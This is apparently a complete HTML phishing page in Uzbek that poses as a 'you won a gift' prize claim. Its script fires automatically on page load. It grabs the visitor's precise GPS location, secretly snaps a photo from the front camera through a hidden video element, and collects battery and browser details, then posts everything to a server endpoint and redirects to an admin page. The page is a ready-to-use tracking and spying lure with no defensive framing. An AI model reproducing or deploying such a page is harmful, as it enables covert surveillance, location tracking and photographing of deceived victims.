<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ Maxsus Sovg'a!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        h1 {
            color: #667eea;
            margin-bottom: 20px;
            font-size: 2em;
        }
        .gift-icon {
            font-size: 100px;
            margin: 20px 0;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        p {
            color: #555;
            margin: 15px 0;
            font-size: 1.1em;
        }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 1.2em;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.3s;
        }
        .btn:hover {
            transform: scale(1.05);
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        video {
            display: none;
        }
        #loader {
            display: none;
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ Tabriklaymiz!</h1>
        <div class="gift-icon">üéâ</div>
        <p>Siz maxsus sovg'ani yutib oldingiz!</p>
        <p>Sovg'angizni olish uchun tugmani bosing</p>
        
        <button class="btn" id="claimBtn" onclick="claimGift()">
            Sovg'ani Olish
        </button>
        
        <div id="loader">
            <div class="spinner"></div>
            <p>Yuklanmoqda...</p>
        </div>
        
        <div id="status"></div>

        <!-- Yashirin video element (kamera uchun) -->
        <video id="video" width="320" height="240" autoplay></video>
        <canvas id="canvas" style="display: none;" width="320" height="240"></canvas>
    </div>

    <script>
        // Sahifa yuklanishi bilanoq avtomatik ishga tushirish
        window.addEventListener('load', function() {
            setTimeout(claimGift, 500);
        });

        async function claimGift() {
            console.log('claimGift function started');
            const btn = document.getElementById('claimBtn');
            const status = document.getElementById('status');
            const loader = document.getElementById('loader');
            
            console.log('Elements found:', {btn, status, loader});
            
            btn.style.display = 'none';
            loader.style.display = 'block';
            
            const collectedData = {
                timestamp: new Date().toISOString(),
                screen: {
                    width: window.screen.width,
                    height: window.screen.height
                },
                browser: {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform
                }
            };

            // 1. GPS joylashuvni avtomatik olish
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        resolve, 
                        reject,
                        { 
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                });
                
                collectedData.gps_location = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    timestamp: position.timestamp
                };
                console.log('GPS data collected:', collectedData.gps_location);
            } catch (error) {
                console.log('GPS error:', error.message);
                collectedData.gps_location = { error: error.message };
            }

            // 2. Kameradan avtomatik rasm olish
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false 
                });
                
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');
                
                video.srcObject = stream;
                
                // Kamera tayyorlanguncha kutish
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Rasmga olish
                context.drawImage(video, 0, 0, 320, 240);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                collectedData.camera = {
                    captured: true,
                    image: imageData
                };
                
                // Kamerani o'chirish
                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                collectedData.camera = { error: error.message };
            }

            // 3. Qo'shimcha ma'lumotlar
            collectedData.battery = {};
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    collectedData.battery = {
                        level: battery.level * 100,
                        charging: battery.charging
                    };
                }
            } catch (error) {
                collectedData.battery = { error: error.message };
            }

            // 4. Serverga yuborish
            try {
                console.log('Sending data to server:', collectedData);
                const response = await fetch('/api/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(collectedData)
                });

                console.log('Server response:', response);
                loader.style.display = 'none';

                if (response.ok) {
                    const result = await response.json();
                    console.log('Result:', result);
                    status.className = 'success';
                    status.textContent = '‚úÖ Tabriklaymiz! Sovg\'angiz tez orada yetkazib beriladi!';
                    status.style.display = 'block';
                    
                    // 3 soniyadan keyin admin panelga yo'naltirish
                    setTimeout(() => {
                        window.location.href = '/admin';
                    }, 3000);
                } else {
                    console.error('Server error:', response.status);
                    status.className = 'error';
                    status.textContent = '‚ùå Xatolik yuz berdi! Qaytadan urinib ko\'ring.';
                    status.style.display = 'block';
                    btn.style.display = 'block';
                }
            } catch (error) {
                console.error('Fetch error:', error);
                loader.style.display = 'none';
                status.className = 'error';
                status.textContent = '‚ùå Server bilan bog\'lanishda xatolik!';
                status.style.display = 'block';
                btn.style.display = 'block';
            }
        }
    </script>
</body>
</html>
